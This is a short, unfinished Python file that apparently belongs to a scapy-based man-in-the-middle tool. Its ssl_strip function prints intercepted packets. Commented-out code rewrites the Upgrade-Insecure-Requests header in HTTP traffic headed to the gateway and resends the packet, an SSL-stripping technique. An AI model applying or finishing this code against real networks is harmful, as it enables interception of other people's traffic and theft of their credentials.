from scapy.all import Ether, TCP, Raw, sendp, send
from networking import *
from packetManip import *

def ssl_strip(packet):

    # Try to decode packet
    try:
        packet_load = get_dprl("Decoded Packet", packet)
        if (packet_load):
            print(packet_load)
    except:
        print("Something went wrong...")
        pass

    try:
        pass
        # sendp(packet)

        # gateway_ip = get_default_gateway_ip()
        # gateway_mac = get_mac_address(gateway_ip)

        # if TCP in packet and packet[TCP].dport == 80 and "Upgrade-Insecure-Requests" in str(packet[Raw].load) and packet[Ether].dst == gateway_mac:
        #     decoded_prl = packet[Raw].load.decode()
        #     new_prl = decoded_prl.replace("Upgrade-Insecure-Requests: 1", "Upgrade-Insecure-Requests: 0")

        #     new_prl_encoded = new_prl.encode()
        #     packet[Raw].load = new_prl_encoded

        #     print("Raw_Packet", packet[Raw].load)

        #     try:
        #         send(packet, iface="eth0")
        #     except:
        #         print("Failed to send packet...")
        # else:
        # sendp(packet)

        # ? TODO If SRC == default_gateway then replace ack 0 with 1?

    except:
        print("Something went wrong...")
        pass